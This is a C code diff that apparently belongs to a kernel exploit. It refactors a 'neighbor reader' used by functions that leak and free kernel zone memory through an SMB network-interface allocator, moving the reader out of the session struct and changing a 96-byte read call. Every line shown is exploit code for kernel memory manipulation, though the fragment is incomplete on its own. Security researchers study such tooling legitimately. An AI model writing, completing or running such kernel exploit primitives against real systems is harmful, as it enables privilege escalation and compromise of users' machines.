@@ -30,7 +30,6 @@
 
 
 struct kmem_zkext_free_session {
-    kmem_zkext_neighour_reader_t reader;
     smb_nic_allocator nic_allocator;
     kmem_allocator_nic_parallel_t capture_allocator;
     
@@ -85,7 +84,7 @@ int kmem_zkext_free_kext_leak_nic(smb_nic_allocator allocator, kmem_zkext_neigho
     xe_assert_err(error);
     
     char data[96];
-    error = kmem_zkext_neighbor_reader_prepare_read_modified(neighbor_reader, data, sizeof(data));
+    error = kmem_zkext_neighbor_reader_read(neighbor_reader, 96, data, sizeof(data));
     if (error) {
         return error;
     }
@@ -147,7 +146,6 @@ void kmem_zkext_free_kext_reserve_nics(smb_nic_allocator allocator, size_t count
 
 kmem_zkext_free_session_t kmem_zkext_free_session_create(const struct sockaddr_in* smb_addr) {
     kmem_zkext_free_session_t session = malloc(sizeof(struct kmem_zkext_free_session));
-    session->reader = kmem_zkext_neighbor_reader_create();
     session->smb_addr = *smb_addr;
     session->nic_allocator = -1;
     session->capture_allocator = NULL;
@@ -158,6 +156,7 @@ kmem_zkext_free_session_t kmem_zkext_free_session_create(const struct sockaddr_i
 
 struct complete_nic_info_entry kmem_zkext_free_session_prepare(kmem_zkext_free_session_t session) {
     xe_assert(session->state == STATE_CREATED);
+    kmem_zkext_neighour_reader_t reader = kmem_zkext_neighbor_reader_create(&session->smb_addr);
     
     smb_nic_allocator nic_allocator;
     struct complete_nic_info_entry entry;
@@ -165,10 +164,10 @@ struct complete_nic_info_entry kmem_zkext_free_session_prepare(kmem_zkext_free_s
     do {
         XE_LOG_DEBUG("attempt to capture nic");
         nic_allocator = smb_nic_allocator_create(&session->smb_addr, sizeof(session->smb_addr));
-        int error = kmem_zkext_free_kext_leak_nic(nic_allocator, session->reader, &session->smb_addr, &entry);
+        int error = kmem_zkext_free_kext_leak_nic(nic_allocator, reader, &session->smb_addr, &entry);
         if (error) {
             smb_nic_allocator_destroy(&nic_allocator);
-            kmem_zkext_neighbor_reader_reset(session->reader);
+            kmem_zkext_neighbor_reader_reset(reader);
         } else {
             break;
         }
@@ -177,6 +176,7 @@ struct complete_nic_info_entry kmem_zkext_free_session_prepare(kmem_zkext_free_s
     xe_assert(tries >= 0);
     xe_assert(entry.next.prev != 0);
     
+    kmem_zkext_neighbor_reader_destroy(&reader);
     session->nic_allocator = nic_allocator;
     session->state = STATE_PREPARED;
     return entry;
@@ -227,7 +227,6 @@ void kmem_zkext_free_session_destroy(kmem_zkext_free_session_t* session_p) {
         kmem_allocator_nic_parallel_destroy(&session->capture_allocator);
     }
     
-    kmem_zkext_neighbor_reader_destroy(&session->reader);
     free(session);
     *session_p = NULL;
 }
